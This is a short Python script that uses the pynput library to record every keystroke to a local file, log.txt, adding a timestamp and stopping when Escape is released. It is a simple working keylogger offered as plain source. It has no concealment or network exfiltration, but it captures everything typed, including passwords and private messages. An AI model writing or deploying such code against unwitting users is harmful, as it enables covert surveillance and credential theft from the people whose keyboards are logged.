import time
from pynput.keyboard import Key, Listener

datetime = time.ctime(time.time())
with open("log.txt", 'a') as f:
    f.write('\n' + datetime + "\n")


def key_pressed(key):
    print(str(key))
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'

    if key.find("Key") == -1:
        with open("log.txt", 'a') as fl:
            fl.write(key)


def key_released(key):
    if key == Key.esc:
        return False


with Listener(on_press=key_pressed, on_release=key_released) as ls:
    ls.join()
